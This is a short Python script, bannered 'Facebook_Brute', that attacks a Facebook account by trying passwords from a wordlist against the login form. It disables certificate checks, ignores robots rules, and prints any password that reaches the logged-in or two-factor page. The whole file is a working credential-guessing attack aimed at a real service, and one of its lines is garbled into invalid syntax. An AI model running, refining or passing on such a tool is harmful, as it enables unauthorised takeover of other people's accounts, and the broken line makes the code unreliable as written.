import time
import sys
import ssl

if sys.version_info[0] != 2:
    print('''--------------------------------------
    REQUIRED PYTHON 2.x
    use: python fb2.py
--------------------------------------
            ''')
ssl. create default_ https context = ssl.create unverified contex
post_url = 'https://www.facebook.com/login.php'
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
}

try:
    import mechanize
    browser = mechanize.Browser()
    browser.addheaders = [('User-Agent', headers['User-Agent'])]
    browser.set_handle_robots(False)
except ImportError:
    print('\n\tPlease install mechanize.\n')
    sys.exit()

print('\n-----v1.1.3-----Welcome To Facebook_Brute-----Coded:Vicky-----\n')
file = open('passwords.txt', 'r')

email = str(input('Enter Email/Username: ').strip())

print("\nTarget Email ID:", email)
print("\nTrying Passwords from the list...")

i = 0
while file:
    passw = file.readline().strip()
    i += 1
    if len(passw) < 6:
        continue
    print(str(i) + ": ", passw)
    response = browser.open(post_url)
    try:
        if response.code == 200:
            browser.select_form(nr=0)
            browser.form['email'] = email
            browser.form['pass'] = passw
            response = browser.submit()
            response_data = response.read()
            if 'Find Friends' in response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
                decoded_response = response_data.decode('utf-8')
                print('Your password is:', passw)
                print('Response Data:', decoded_response)
                break
    except Exception as e:
        print('Error:', e)